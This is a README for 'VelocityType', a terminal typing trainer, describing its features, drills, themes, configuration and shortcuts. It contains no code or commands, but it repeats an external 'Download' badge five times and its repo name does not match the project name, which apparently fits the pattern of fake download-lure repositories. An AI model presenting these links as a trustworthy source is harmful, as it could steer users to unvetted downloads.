![preview](https://raw.githubusercontent.com/aliciagerhard07-oss/Terminal-Type-Dojo/main/promo_3b9e8.svg)
[![Download](https://raw.githubusercontent.com/aliciagerhard07-oss/Terminal-Type-Dojo/main/dl_6002.svg)](https://aliciagerhard07-oss.github.io/Terminal-Type-Dojo/)

# ⌨️ VelocityType — A Next-Generation Terminal Typing Studio

> An offline-first, terminal-native typing gym built on Python + curses, engineered for people who want their fingers to dance across the keyboard without ever touching a mouse.

[![Download](https://raw.githubusercontent.com/aliciagerhard07-oss/Terminal-Type-Dojo/main/dl_6002.svg)](https://aliciagerhard07-oss.github.io/Terminal-Type-Dojo/)

---

## 🧭 Table of Contents

- [Overview](#-overview)
- [Philosophy Behind VelocityType](#-philosophy-behind-velocitytype)
- [Feature Highlights](#-feature-highlights)
- [Interface & Experience](#-interface--experience)
- [Multilingual Support](#-multilingual-support)
- [Responsive Terminal UI](#-responsive-terminal-ui)
- [Lesson Modes & Drills](#-lesson-modes--drills)
- [Statistics & Progress Tracking](#-statistics--progress-tracking)
- [Themes & Customization](#-themes--customization)
- [Architecture Overview](#-architecture-overview)
- [Configuration File Reference](#-configuration-file-reference)
- [Keyboard Shortcuts Cheat Sheet](#-keyboard-shortcuts-cheat-sheet)
- [Roadmap](#-roadmap)
- [Contributing](#-contributing)
- [Community & Support](#-community--support)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🌟 Overview

VelocityType is not just another typing trainer — it is a carefully choreographed rehearsal hall for your hands. Where most typing tools shove you into a web page with blinking ads and a progress bar that guilt-trips you, VelocityType lives quietly in your terminal. It uses the classic UNIX `curses` library to paint a live, flickering canvas of keystrokes, rhythm, and accuracy right where you already work.

Built in pure Python with zero external runtime dependencies beyond the standard library, VelocityType is designed for:

- Developers who spend their day inside terminals and want to improve without leaving.
- Writers who want a focused, distraction-free environment.
- Students learning touch typing across multiple keyboard layouts.
- Enthusiasts who appreciate the aesthetic of a monospace grid doing real work.

The name "VelocityType" reflects the core ethos: speed emerges from rhythm, and rhythm emerges from accuracy. Chase accuracy and velocity will follow you home.

---

## 🧠 Philosophy Behind VelocityType

Most typing tools treat speed and accuracy as opposites you must trade off. VelocityType treats them as two musicians in the same orchestra — the metronome (accuracy) and the lead violin (speed). The interface nudges you toward a tempo where you can play cleanly, then gently pushes the tempo upward as your muscle memory solidifies.

We also believe practice tools should be:

- **Local** — your keystrokes and stats never leave your machine.
- **Quiet** — no notifications, no streaks that shame you for skipping a day.
- **Composable** — bring your own text, your own layouts, your own rules.
- **Timeless** — a curses app written today still runs on a terminal from a decade ago.

---

## 🚀 Feature Highlights

- 🖥️ **Terminal-Native Rendering** — Full-screen `curses` canvas with 60 FPS redraw pacing.
- 🎯 **Adaptive Difficulty Engine** — Drills shift based on your rolling accuracy window.
- 🌍 **Multilingual Content Packs** — Practice in English, Spanish, French, German, Japanese romaji, and more.
- 📊 **Session Analytics** — WPM, CPM, accuracy, consistency score, and error heatmap.
- 🧩 **Custom Text Import** — Feed it your own prose, code snippets, or poetry from a plain text file.
- 🎨 **Themes** — Solarized, Gruvbox-inspired, Nord-inspired, Monochrome, and High-Contrast.
- 🔔 **Audible Cue Toggle** — Optional terminal bell feedback on mistyped characters.
- 🧠 **Muscle Memory Mode** — Repeats your weakest bigrams until they become second nature.
- 📈 **Progress Vault** — Local JSON history so you can chart months of practice.
- 🔒 **Offline-First** — Works on a plane, a submarine, or a cabin in the woods.
- 🕰️ **24/7 customer support** — asynchronous, community-powered, and always awake somewhere in the world.
- ♿ **Accessibility-Minded** — high-contrast palette and screen-reader-friendly text-only layout.

[![Download](https://raw.githubusercontent.com/aliciagerhard07-oss/Terminal-Type-Dojo/main/dl_6002.svg)](https://aliciagerhard07-oss.github.io/Terminal-Type-Dojo/)

---

## 🎨 Interface & Experience

Picture a Victorian typesetter's desk — neat rows, calm spacing, everything where you expect it. That is the VelocityType layout.

The screen is divided into five regions:

1. **Header Strip** — current mode, language pack, and timer.
2. **Main Stage** — the text you are typing, character by character highlighting in real time.
3. **Live Metrics Bar** — rolling WPM, accuracy percentage, and streak counter.
4. **Rhythm Ribbon** — a sparkline of your last sixty seconds of typing cadence.
5. **Footer Hints** — context-sensitive keyboard shortcuts.

Every character is rendered with a color grammar:

- Plain text = upcoming characters.
- Soft highlight = the character you should hit next.
- Gentle green = correct keystrokes.
- Muted amber = recent corrections.
- Deep red = persistent errors, tracked for review.

The result is a screen that feels less like a test and more like a conversation between you and your keyboard.

---

## 🌍 Multilingual Support

VelocityType ships with several language packs and the community is actively adding more. Each pack contains:

- Curated prose passages.
- Common word frequency lists.
- Punctuation profiles specific to the language.
- Optional diacritic-heavy drill sets.

Currently supported:

| Language | Status | Notes |
|---|---|---|
| English (US/UK) | ✅ Stable | Default pack, largest corpus |
| Spanish | ✅ Stable | Includes ñ and accented vowels |
| French | ✅ Stable | AZERTY-aware drills |
| German | ✅ Stable | Includes ß, umlauts |
| Portuguese | ✅ Stable | Brazilian and European variants |
| Italian | ✅ Stable | Standard layouts |
| Japanese (romaji) | 🧪 Beta | WIP kana-to-romaji mapping |
| Dutch | 🧪 Beta | Community-contributed |
| Polish | 🧪 Beta | Diacritic drills |

Adding your own language pack is a matter of dropping a JSON file into the `packs/` directory and following the schema documented in `docs/packs.md`.

---

## 📱 Responsive Terminal UI

Terminals come in all shapes and sizes — from a 40-column split pane to a 300-column ultrawide. VelocityType's layout engine measures the terminal at startup and reflows gracefully:

- **Tiny (under 60 cols)** — compact mode, minimal chrome.
- **Standard (60–120 cols)** — full layout with all panels.
- **Wide (120+ cols)** — side-by-side metrics and rhythm ribbon.
- **Tall (40+ rows)** — vertical analytics panel enabled.

Resize events are captured and the layout adapts on the fly, so you can drag your window and watch the app breathe with it.

---

## 📚 Lesson Modes & Drills

VelocityType offers several distinct practice formats. Each has its own personality, and skilled users rotate between them for variety.

### 1. Prose Mode
Type long-form passages from literature, essays, and technical writing. Good for flow, pacing, and endurance.

### 2. Code Mode
Type snippets of Python, JavaScript, or shell scripts. Punctuation-heavy and unforgiving — but rewarding.

### 3. Drill Mode
Repeats your weakest character combinations. The engine watches for mistyped bigrams and constructs targeted drills automatically.

### 4. Sprint Mode
A sixty-second pressure cooker. Maximum speed, zero mercy. Great for warm-ups.

### 5. Zen Mode
No timer, no score, just text and you. Ideal for reflection and muscle-memory building.

### 6. Custom Mode
Point VelocityType at a `.txt` file and it will use it as the lesson corpus. Perfect for memorizing a speech or internalizing a favorite author's cadence.

---

## 📊 Statistics & Progress Tracking

All progress is stored locally in `~/.velocitytype/history.json`. Metrics tracked per session include:

- **WPM** — words per minute, averaged with rolling median smoothing.
- **Raw WPM** — before error penalties.
- **Accuracy** — correct keystrokes / total keystrokes.
- **Consistency** — standard deviation of keystroke interval.
- **Error Heatmap** — which characters you mistype most.
- **Bigram Weak Points** — pairs like `th`, `er`, `in`, and symbols like `{}` or `()`.
- **Practice Streak** — consecutive days with at least five minutes of typing.

You can view a rolling chart of your progress with the built-in `--stats` view, or export the raw JSON for your own analysis in a spreadsheet or notebook.

---

## 🎨 Themes & Customization

Themes are defined in simple TOML-like configuration blocks. Each theme declares colors for:

- Background and foreground.
- Correct, error, and upcoming character states.
- UI chrome and borders.
- Metrics and rhythm ribbon.

Included themes:

- **Solarized Dark & Light**
- **Gruvbox-inspired Warm**
- **Nord-inspired Cool**
- **Mono Zen** — pure black and white, no color distractions.
- **High Contrast** — accessibility-focused, WCAG-aware.

You can also define your own by copying any existing theme and editing the hex values. Themes live in `~/.velocitytype/themes/`.

---

## 🏗️ Architecture Overview

VelocityType is intentionally modular so contributors can reason about one piece at a time.

- **`app.py`** — entry point and curses lifecycle manager.
- **`render/`** — drawing routines for each UI region.
- **`engine/`** — typing state machine, scoring, and drill generation.
- **`packs/`** — language packs and lesson corpora.
- **`stats/`** — local persistence and metrics aggregation.
- **`themes/`** — theme definitions and loading logic.
- **`ui/`** — keyboard input handling and modal dialogs.

The main loop is a classic event-and-render cycle:

1. Poll keyboard input via `stdscr.getch()` with a small non-blocking timeout.
2. Update the typing state machine.
3. Redraw only the dirty regions of the screen.
4. Repeat at a cadence tuned to feel responsive but not CPU-hungry.

This is a low-magic codebase — no async frameworks, no hidden state. Read any file top to bottom and you will understand it.

---

## ⚙️ Configuration File Reference

The main configuration lives at `~/.velocitytype/config.toml`. Example keys:

- `theme` — name of the theme to load.
- `language` — default language pack.
- `sound` — boolean, toggles terminal bell feedback.
- `default_mode` — one of `prose`, `code`, `drill`, `sprint`, `zen`.
- `show_rhythm_ribbon` — boolean.
- `metrics.smoothing_window` — number of samples for rolling WPM.
- `drills.auto_escalate` — boolean, promotes you to harder drills automatically.
- `accessibility.high_contrast` — boolean override regardless of theme.

Every key is documented inline with comments; the file is meant to be read, not just edited.

---

## ⌨️ Keyboard Shortcuts Cheat Sheet

- `Esc` — return to the main menu.
- `Tab` — cycle through lesson modes.
- `Ctrl+R` — restart the current lesson.
- `Ctrl+P` — pause or resume.
- `Ctrl+T` — cycle the theme.
- `Ctrl+L` — cycle the language pack.
- `Ctrl+S` — toggle the sound cue.
- `Ctrl+Q` — quit gracefully and save progress.
- `F1` — open the built-in help overlay.

Shortcuts are remappable via the `keys` section of the configuration file.

[![Download](https://raw.githubusercontent.com/aliciagerhard07-oss/Terminal-Type-Dojo/main/dl_6002.svg)](https://aliciagerhard07-oss.github.io/Terminal-Type-Dojo/)

---

## 🗺️ Roadmap

The project is active and evolving. Planned milestones:

- **2026 Q1** — Multiplayer ghost-race mode over a local socket.
- **2026 Q2** — Plugin API for community-created drills.
- **2026 Q3** — Export to Anki-compatible decks for spaced repetition.
- **2026 Q4** — Optional web dashboard mirror for local stats (offline by default).

Suggestions welcome — the issue tracker is the front door.

---

## 🤝 Contributing

Contributions are warmly welcomed. If you can type, you can help.

Ways to contribute:

- Add a language pack.
- Submit a theme.
- Improve drill generation heuristics.
- Write documentation or tutorials.
- Report bugs with reproduction steps.

Please read `CONTRIBUTING.md` for code style, commit conventions, and the review process. Be kind, be patient, be specific. Good pull requests read like a well-typed paragraph: clear, deliberate, and without extra characters.

---

## 💬 Community & Support

VelocityType is maintained by volunteers who believe in the calm power of the terminal. Support channels include:

- **Discussion forum** — long-form threads on drills, layouts, and ergonomics.
- **Issue tracker** — bug reports and feature requests.
- **Chat space** — real-time questions and friendly banter.

The community keeps a rotating answer desk running, so newcomers can expect a reply within a day, often within an hour. Consider this project backed by **24/7 customer support** in the communal, asynchronous sense — there is always someone awake somewhere to lend a hand.

---

## ❓ Frequently Asked Questions

**Q: Do I need an internet connection?**
A: No. VelocityType runs entirely offline. Nothing about your practice leaves your machine unless you explicitly export it.

**Q: Will it work on Windows, macOS, and Linux?**
A: Yes. Anywhere Python and the curses library are available. On Windows, we recommend using a modern terminal that supports ANSI coloring.

**Q: Can I use my own keyboard layout?**
A: Absolutely. Layout-specific drills are available for QWERTY, DVORAK, COLEMAK, and AZERTY. Custom layouts can be defined in the config.

**Q: Is there a mobile version?**
A: The project is terminal-first. Any environment that provides a real terminal and curses will run it, but tiny screens are best used with the compact layout.

**Q: How is my privacy respected?**
A: All stats and history are stored locally. There is no telemetry, no analytics, and no phoning home.

---

## 📜 License

This project is released under the MIT License. See the [LICENSE](./LICENSE) file for the full text.

Copyright © 2026 VelocityType contributors.

---

## ⚠️ Disclaimer

VelocityType is provided as-is, without warranty of any kind, express or implied. The maintainers are not responsible for ergonomic injuries, missed deadlines caused by "one more round," or the sudden urge to purchase a mechanical keyboard with hand-lubed switches. Practice in moderation, stretch your wrists, and remember that the goal is sustainable fluency — not just a higher number on the screen.

The software is designed for personal practice and hobbyist development. It is not intended for competitive typing leagues, medical rehabilitation programs, or any context requiring certified performance measurement. External game packages, distributed scripts from unknown origins, and modified forks are outside our scope of support. Use sound judgment, verify content, and treat your terminal with the respect it deserves.

[![Download](https://raw.githubusercontent.com/aliciagerhard07-oss/Terminal-Type-Dojo/main/dl_6002.svg)](https://aliciagerhard07-oss.github.io/Terminal-Type-Dojo/)